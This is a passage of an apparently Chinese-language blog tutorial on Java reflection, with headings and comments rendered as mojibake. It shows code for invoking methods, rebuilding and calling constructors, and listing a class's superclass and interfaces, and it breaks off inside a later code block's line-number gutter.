id="é€šè¿‡åå°„æœºåˆ¶è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•"><a href="#é€šè¿‡åå°„æœºåˆ¶è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•" class="headerlink" title="é€šè¿‡åå°„æœºåˆ¶è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•"></a>é€šè¿‡åå°„æœºåˆ¶è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">é‡ç‚¹ï¼šå¿…é¡»æŒæ¡ï¼Œé€šè¿‡åå°„æœºåˆ¶æ€ä¹ˆè°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•ï¼Ÿ</span></span><br><span class="line"><span class="comment">    äº”é¢—æ˜Ÿ*****</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    åå°„æœºåˆ¶ï¼Œè®©ä»£ç å¾ˆå…·æœ‰é€šç”¨æ€§ï¼Œå¯å˜åŒ–çš„å†…å®¹éƒ½æ˜¯å†™åˆ°é…ç½®æ–‡ä»¶å½“ä¸­ï¼Œ</span></span><br><span class="line"><span class="comment">    å°†æ¥ä¿®æ”¹é…ç½®æ–‡ä»¶ä¹‹åï¼Œåˆ›å»ºçš„å¯¹è±¡ä¸ä¸€æ ·äº†ï¼Œè°ƒç”¨çš„æ–¹æ³•ä¹Ÿä¸åŒäº†ï¼Œ</span></span><br><span class="line"><span class="comment">    ä½†æ˜¯javaä»£ç ä¸éœ€è¦åšä»»ä½•æ”¹åŠ¨ã€‚è¿™å°±æ˜¯åå°„æœºåˆ¶çš„é­…åŠ›ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest10</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// ä¸ä½¿ç”¨åå°„æœºåˆ¶ï¼Œæ€ä¹ˆè°ƒç”¨æ–¹æ³•</span></span><br><span class="line">        <span class="comment">// åˆ›å»ºå¯¹è±¡</span></span><br><span class="line">        <span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserService</span>();</span><br><span class="line">        <span class="comment">// è°ƒç”¨æ–¹æ³•</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            è¦ç´ åˆ†æï¼š</span></span><br><span class="line"><span class="comment">                è¦ç´ 1ï¼šå¯¹è±¡userService</span></span><br><span class="line"><span class="comment">                è¦ç´ 2ï¼šloginæ–¹æ³•å</span></span><br><span class="line"><span class="comment">                è¦ç´ 3ï¼šå®å‚åˆ—è¡¨</span></span><br><span class="line"><span class="comment">                è¦ç´ 4ï¼šè¿”å›å€¼</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.out.println(userService.login(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;123&quot;</span>) ? <span class="string">&quot;ç™»å…¥æˆåŠŸï¼&quot;</span> : <span class="string">&quot;ç™»å…¥å¤±è´¥ï¼&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä½¿ç”¨åå°„æœºåˆ¶è°ƒç”¨æ–¹æ³•</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">userServiceClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.UserService&quot;</span>);</span><br><span class="line">        <span class="comment">// åˆ›å»ºå¯¹è±¡</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> userServiceClass.newInstance();</span><br><span class="line">        <span class="comment">// è·å–Method</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">loginMethod</span> <span class="operator">=</span> userServiceClass.getDeclaredMethod(<span class="string">&quot;login&quot;</span>, String.class, String.class);</span><br><span class="line"><span class="comment">//        Method loginMethod = userServiceClass.getDeclaredMethod(&quot;login&quot;);//æ³¨ï¼šæ²¡æœ‰å½¢å‚å°±ä¸ä¼ </span></span><br><span class="line">        <span class="comment">// è°ƒç”¨æ–¹æ³•</span></span><br><span class="line">        <span class="comment">// è°ƒç”¨æ–¹æ³•æœ‰å‡ ä¸ªè¦ç´ ï¼Ÿ ä¹Ÿéœ€è¦4è¦ç´ ã€‚</span></span><br><span class="line">        <span class="comment">// åå°„æœºåˆ¶ä¸­æœ€æœ€æœ€æœ€æœ€é‡è¦çš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¿…é¡»è®°ä½ã€‚</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            å››è¦ç´ ï¼š</span></span><br><span class="line"><span class="comment">            loginMethodæ–¹æ³•</span></span><br><span class="line"><span class="comment">            objå¯¹è±¡</span></span><br><span class="line"><span class="comment">            &quot;admin&quot;,&quot;123&quot; å®å‚</span></span><br><span class="line"><span class="comment">            retValue è¿”å›å€¼</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">resValues</span> <span class="operator">=</span> loginMethod.invoke(obj, <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;123&quot;</span>);<span class="comment">//æ³¨ï¼šæ–¹æ³•è¿”å›å€¼æ˜¯void ç»“æœæ˜¯null</span></span><br><span class="line">        System.out.println(resValues);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4åå°„Constructorã€åå°„-åç¼–è¯‘ä¸€ä¸ªç±»çš„æ„é€ æ–¹æ³•ã€‘"><a href="#4åå°„Constructorã€åå°„-åç¼–è¯‘ä¸€ä¸ªç±»çš„æ„é€ æ–¹æ³•ã€‘" class="headerlink" title="4åå°„Constructorã€åå°„&#x2F;åç¼–è¯‘ä¸€ä¸ªç±»çš„æ„é€ æ–¹æ³•ã€‘"></a>4åå°„Constructorã€åå°„&#x2F;åç¼–è¯‘ä¸€ä¸ªç±»çš„æ„é€ æ–¹æ³•ã€‘</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713696083185-8aeb0f75-d074-4939-9535-2afc8abf6533.png"></p><h4 id="åç¼–è¯‘ä¸€ä¸ªç±»çš„æ„é€ æ–¹æ³•Constructor"><a href="#åç¼–è¯‘ä¸€ä¸ªç±»çš„æ„é€ æ–¹æ³•Constructor" class="headerlink" title="åç¼–è¯‘ä¸€ä¸ªç±»çš„æ„é€ æ–¹æ³•Constructor"></a>åç¼–è¯‘ä¸€ä¸ªç±»çš„æ„é€ æ–¹æ³•Constructor</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest11</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">vipClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.Vip&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//public class UserService &#123;</span></span><br><span class="line">        s.append(Modifier.toString(vipClass.getModifiers()));</span><br><span class="line">        s.append(<span class="string">&quot; class &quot;</span>);</span><br><span class="line">        s.append(vipClass.getSimpleName());</span><br><span class="line">        s.append(<span class="string">&quot;&#123;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Constructor[] constructors = vipClass.getDeclaredConstructors();</span><br><span class="line">        <span class="keyword">for</span> (Constructor c : constructors)&#123;</span><br><span class="line">            <span class="comment">//public Vip(int no, String name, String birth, boolean sex) &#123;</span></span><br><span class="line">            s.append(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            s.append(Modifier.toString(c.getModifiers()));</span><br><span class="line">            s.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line"><span class="comment">//            s.append(c.getName());//åŒ…å+ç±»å</span></span><br><span class="line">            s.append(vipClass.getSimpleName());<span class="comment">//ç±»å</span></span><br><span class="line">            s.append(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">            Class[] parameterTypes = c.getParameterTypes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; parameterTypes.length; i++)&#123;</span><br><span class="line">                s.append(parameterTypes[i].getSimpleName());</span><br><span class="line">                <span class="keyword">if</span> (i != parameterTypes.length - <span class="number">1</span> ) s.append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            s.append(<span class="string">&quot;)&#123;&#125;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        s.append(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-1åå°„æœºåˆ¶åˆ›å»ºå¯¹è±¡ä¸¤æ­¥éª¤"><a href="#4-1åå°„æœºåˆ¶åˆ›å»ºå¯¹è±¡ä¸¤æ­¥éª¤" class="headerlink" title="4.1åå°„æœºåˆ¶åˆ›å»ºå¯¹è±¡ä¸¤æ­¥éª¤"></a>4.1åå°„æœºåˆ¶åˆ›å»ºå¯¹è±¡ä¸¤æ­¥éª¤</h3><p>1.å…ˆè·å–åˆ°è¿™ä¸ªæœ‰å‚æ•°çš„æ„é€ æ–¹æ³•ã€ç”¨ClassgetDeclaredConstructor()æ–¹æ³•è·å–ã€‘</p><p>2.è°ƒç”¨æ„é€ æ–¹æ³•newå¯¹è±¡ã€ç”¨Constructorç±»çš„newInstance()æ–¹æ³•newå¯¹è±¡ã€‘</p><h4 id="4-1-1é€šè¿‡åå°„æœºåˆ¶è°ƒç”¨æ„é€ æ–¹æ³•å®ä¾‹åŒ–javaå¯¹è±¡"><a href="#4-1-1é€šè¿‡åå°„æœºåˆ¶è°ƒç”¨æ„é€ æ–¹æ³•å®ä¾‹åŒ–javaå¯¹è±¡" class="headerlink" title="4.1.1é€šè¿‡åå°„æœºåˆ¶è°ƒç”¨æ„é€ æ–¹æ³•å®ä¾‹åŒ–javaå¯¹è±¡"></a>4.1.1é€šè¿‡åå°„æœºåˆ¶è°ƒç”¨æ„é€ æ–¹æ³•å®ä¾‹åŒ–javaå¯¹è±¡</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">æ¯”ä¸Šä¸€ä¸ªä¾‹å­(ReflectTest11)é‡è¦ä¸€äº›ï¼ï¼ï¼</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">é€šè¿‡åå°„æœºåˆ¶è°ƒç”¨æ„é€ æ–¹æ³•å®ä¾‹åŒ–javaå¯¹è±¡ã€‚ï¼ˆè¿™ä¸ªä¸æ˜¯é‡ç‚¹ï¼‰</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest12</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//ä¸é€‚ç”¨åå°„åˆ›å»ºå¯¹è±¡</span></span><br><span class="line">        <span class="type">Vip</span> <span class="variable">vip1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vip</span>();</span><br><span class="line">        <span class="type">Vip</span> <span class="variable">vip2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vip</span>(<span class="number">123</span>, <span class="string">&quot;zhangsan&quot;</span>, <span class="string">&quot;2001-10-19&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä½¿ç”¨åå°„æœºåˆ¶åˆ›å»ºå¯¹è±¡ï¼ˆä»¥å‰ï¼‰</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">vipClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.Vip&quot;</span>);</span><br><span class="line">        <span class="comment">// è°ƒç”¨æ— å‚æ•°æ„é€ æ–¹æ³•</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj1</span> <span class="operator">=</span> vipClass.newInstance();<span class="comment">//Classç±»çš„newInstanceæ–¹æ³•</span></span><br><span class="line">        System.out.println(obj1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä½¿ç”¨åå°„æœºåˆ¶åˆ›å»ºå¯¹è±¡ï¼ˆç°åœ¨ï¼‰</span></span><br><span class="line">        <span class="comment">// è°ƒç”¨æœ‰å‚æ•°çš„æ„é€ æ–¹æ³•æ€ä¹ˆåŠï¼Ÿ</span></span><br><span class="line">        <span class="comment">// ç¬¬ä¸€æ­¥ï¼šå…ˆè·å–åˆ°è¿™ä¸ªæœ‰å‚æ•°çš„æ„é€ æ–¹æ³•</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">c1</span> <span class="operator">=</span> vipClass.getDeclaredConstructor(<span class="type">int</span>.class, String.class, String.class, <span class="type">boolean</span>.class);</span><br><span class="line">        <span class="comment">// ç¬¬äºŒæ­¥ï¼šè°ƒç”¨æ„é€ æ–¹æ³•newå¯¹è±¡</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> c1.newInstance(<span class="number">321</span>, <span class="string">&quot;lsi&quot;</span>, <span class="string">&quot;1999-10-11&quot;</span>, <span class="literal">true</span>);<span class="comment">//Constructorç±»çš„newInstanceæ–¹æ³•</span></span><br><span class="line">        System.out.println(obj2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–æ— å‚æ•°æ„é€ æ–¹æ³•</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">c2</span> <span class="operator">=</span> vipClass.getDeclaredConstructor();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj3</span> <span class="operator">=</span> c2.newInstance();</span><br><span class="line">        System.out.println(obj3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5-è·å–ä¸€ä¸ªç±»çš„çˆ¶ç±»ä»¥åŠå®ç°çš„æ¥å£"><a href="#5-è·å–ä¸€ä¸ªç±»çš„çˆ¶ç±»ä»¥åŠå®ç°çš„æ¥å£" class="headerlink" title="5.è·å–ä¸€ä¸ªç±»çš„çˆ¶ç±»ä»¥åŠå®ç°çš„æ¥å£"></a>5.è·å–ä¸€ä¸ªç±»çš„çˆ¶ç±»ä»¥åŠå®ç°çš„æ¥å£</h2><p>ä¸¤ä¸ªæ–¹æ³•ã€Classç±»ä¸­çš„ã€‘</p><ol><li>public native Class&lt;? super T&gt; <strong>getSuperclass</strong>()</li><li>public Class&lt;?&gt;[] <strong>getInterfaces</strong>()</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">é‡ç‚¹ï¼šç»™ä½ ä¸€ä¸ªç±»ï¼Œæ€ä¹ˆè·å–è¿™ä¸ªç±»çš„çˆ¶ç±»ï¼Œå·²ç»å®ç°äº†å“ªäº›æ¥å£ï¼Ÿ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest13</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// Stringä¸¾ä¾‹</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">vipClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">        <span class="comment">// è·å–Stringçš„çˆ¶ç±»</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">superclass</span> <span class="operator">=</span> vipClass.getSuperclass();</span><br><span class="line">        <span class="comment">// è·å–Stringç±»å®ç°çš„æ‰€æœ‰æ¥å£ï¼ˆä¸€ä¸ªç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£ã€‚ï¼‰</span></span><br><span class="line">        Class[] interfaces = vipClass.getInterfaces();</span><br><span class="line">        System.out.println(superclass.getName());</span><br><span class="line">        <span class="keyword">for</span> (Class i : interfaces) &#123;</span><br><span class="line">            System.out.println(i.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span 